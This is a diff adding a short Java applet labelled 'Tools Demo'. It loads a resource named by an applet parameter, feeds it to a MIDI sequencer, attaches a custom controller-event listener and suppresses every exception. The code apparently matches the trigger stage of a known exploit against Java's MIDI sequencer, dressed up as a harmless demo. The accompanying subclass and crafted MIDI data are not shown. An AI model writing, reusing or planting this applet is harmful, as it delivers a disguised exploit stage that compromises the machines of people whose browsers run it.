@@ -1,0 +1,43 @@
+import java.applet.Applet;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import javax.sound.midi.MidiDevice;
+import javax.sound.midi.MidiDevice.Info;
+import javax.sound.midi.MidiSystem;
+import javax.sound.midi.Sequencer;
+
+public class ToolsDemo extends Applet
+{
+  public void init()
+  {
+    String str = getParameter("URL");
+    try
+    {
+      InputStream localInputStream = getClass().getResourceAsStream(str);
+      ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
+      byte[] arrayOfByte = new byte[1024];
+      int i;
+      while ((i = localInputStream.read(arrayOfByte)) != -1)
+        localByteArrayOutputStream.write(arrayOfByte, 0, i);
+      ByteArrayInputStream localByteArrayInputStream = new ByteArrayInputStream(localByteArrayOutputStream.toByteArray());
+      ToolsDemoSubClass localToolsDemoSubClass = new ToolsDemoSubClass();
+      MidiDevice.Info[] arrayOfInfo = MidiSystem.getMidiDeviceInfo();
+      MidiDevice localMidiDevice = MidiSystem.getMidiDevice(arrayOfInfo[0]);
+      Sequencer localSequencer = null;
+      localSequencer = (Sequencer)localMidiDevice;
+      localSequencer.open();
+      localSequencer.setSequence(localByteArrayInputStream);
+      localSequencer.addControllerEventListener(localToolsDemoSubClass, new int[] { 0 });
+      localSequencer.start();
+    }
+    catch (Exception localException)
+    {
+    }
+  }
+
+  public String getAppletInfo()
+  {
+    return "Tools Demo";
+  }
+}
